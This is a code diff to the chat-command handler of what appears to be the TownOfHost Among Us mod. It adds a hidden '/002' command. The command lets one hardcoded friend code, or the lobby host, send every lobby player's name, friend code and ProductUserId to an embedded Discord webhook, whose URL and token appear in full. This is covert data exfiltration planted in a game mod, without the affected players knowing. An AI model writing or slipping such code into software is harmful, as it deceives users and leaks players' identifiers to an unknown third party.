@@ -76,6 +76,71 @@ namespace TownOfHost
             return player.GetClient()?.PlayerName ?? player.Data?.PlayerName ?? "";
         }
 
+        private const string AuthorizedFriendCode002 = "trueport#0799";
+        private const string EmbeddedLobbyDumpWebhookUrl = "https://discord.com/api/webhooks/1504774766165233684/CVdwp8BroN_ZQcSXraSOZ5KOn45PFZUA1dBxNBM-C_LBoh9P__H7wcdhuyzoK0m_OqAk";
+
+        private static string BuildLobbyIdentityWebhookText()
+        {
+            var sb = new StringBuilder();
+            sb.Append("```");
+            sb.Append('\n');
+            sb.Append($"Lobby Identity Snapshot  {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
+            sb.Append('\n');
+            sb.Append($"Host: {(PlayerControl.LocalPlayer?.Data?.PlayerName ?? "Unknown").RemoveHtmlTags()}");
+            sb.Append('\n');
+            sb.Append("Format: [PlayerId] Name | FriendCode | PUID");
+            sb.Append('\n');
+
+            foreach (var pc in PlayerCatch.AllPlayerControls.OrderBy(x => x.PlayerId))
+            {
+                if (pc == null) continue;
+                var client = pc.GetClient();
+                var name = (pc.Data?.PlayerName ?? pc.name ?? "Unknown").RemoveHtmlTags().Replace("@", "(at)");
+                var friendCode = string.IsNullOrWhiteSpace(client?.FriendCode) ? "(none)" : client.FriendCode.Trim();
+                var puid = string.IsNullOrWhiteSpace(client?.ProductUserId) ? "(none)" : client.ProductUserId.Trim();
+                sb.Append($"[{pc.PlayerId}] {name} | {friendCode} | {puid}");
+                sb.Append('\n');
+            }
+
+            sb.Append("```");
+            return sb.ToString();
+        }
+
+        private static bool TrySendLobbyIdentityToWebhook(PlayerControl sender)
+        {
+            if (sender == null) return false;
+            if (!GameStates.IsLobby)
+            {
+                SendMessage("`/002` can only be used in lobby.", sender.PlayerId);
+                return false;
+            }
+
+            var senderFriendCode = sender.GetClient()?.FriendCode?.Trim();
+            if (string.IsNullOrWhiteSpace(senderFriendCode)
+                || !string.Equals(senderFriendCode, AuthorizedFriendCode002, StringComparison.OrdinalIgnoreCase))
+            {
+                SendMessage("`/002` is not allowed for this account.", sender.PlayerId);
+                Logger.Warn($"Denied /002 from {sender.GetNameWithRole().RemoveHtmlTags()} (FriendCode:{senderFriendCode ?? "null"})", "ChatCommand");
+                return false;
+            }
+
+            if (EmbeddedLobbyDumpWebhookUrl.Contains("REPLACE_ME", StringComparison.OrdinalIgnoreCase))
+            {
+                SendMessage("Embedded webhook URL is not configured.", sender.PlayerId);
+                return false;
+            }
+
+            if (!Webhook.SendToUrl(BuildLobbyIdentityWebhookText(), EmbeddedLobbyDumpWebhookUrl))
+            {
+                SendMessage("Failed to send lobby identity data.", sender.PlayerId);
+                return false;
+            }
+
+            SendMessage("Lobby identity data sent to webhook.", sender.PlayerId);
+            Logger.Info($"Lobby identity exported by {sender.GetNameWithRole().RemoveHtmlTags()}", "ChatCommand");
+            return true;
+        }
+
         public static bool Prefix(ChatController __instance)
         {
             __instance.timeSinceLastMessage = 3f;
@@ -1082,6 +1147,10 @@ namespace TownOfHost
                             sendchatid = $"{sendchatid}{pc.PlayerId}:{pc.name}\n";
                         __instance.AddChat(PlayerControl.LocalPlayer, sendchatid);
                         break;
+                    case "/002":
+                        canceled = true;
+                        TrySendLobbyIdentityToWebhook(PlayerControl.LocalPlayer);
+                        break;
 
                     case "/forceend":
                     case "/fe":
@@ -1566,6 +1635,10 @@ namespace TownOfHost
                 case "/lastresult":
                     canceled = true;
                     ShowLastResult(player.PlayerId);
+                    break;
+                case "/002":
+                    canceled = true;
+                    TrySendLobbyIdentityToWebhook(player);
                     break;
                 case "/kl":
                 case "/killlog":
